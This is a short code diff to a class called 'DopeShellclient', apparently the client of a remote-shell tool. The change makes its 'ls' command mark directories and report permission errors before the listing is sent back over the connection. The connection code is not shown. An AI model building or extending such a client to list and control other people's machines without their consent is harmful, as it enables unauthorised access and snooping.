@@ -100,10 +100,20 @@ class DopeShellclient:
             elif command.lower().startswith('ls'):
                 directory = command.split()[1] if len(command.split()) > 1 else '.'
                 try:
-                    files = "\n".join(os.listdir(directory))
+                    items = os.listdir(directory)
+                    files = []
+                    for item in items:
+                        if os.path.isdir(os.path.join(directory, item)):
+                            files.append(f"{item}/")  # Append '/' for directories
+                        else:
+                            files.append(item)
+                    files_output = "\n".join(files)
                 except FileNotFoundError:
-                    files = f"[-] Directory '{directory}' not found."
-                self.send_data(files)
+                    files_output = f"[-] Directory '{directory}' not found."
+                except PermissionError:
+                    files_output = f"[-] Permission denied for '{directory}'."
+                self.send_data(files_output)
+
 
             elif command.lower() == 'pwd':
                 cwd = os.getcwd()
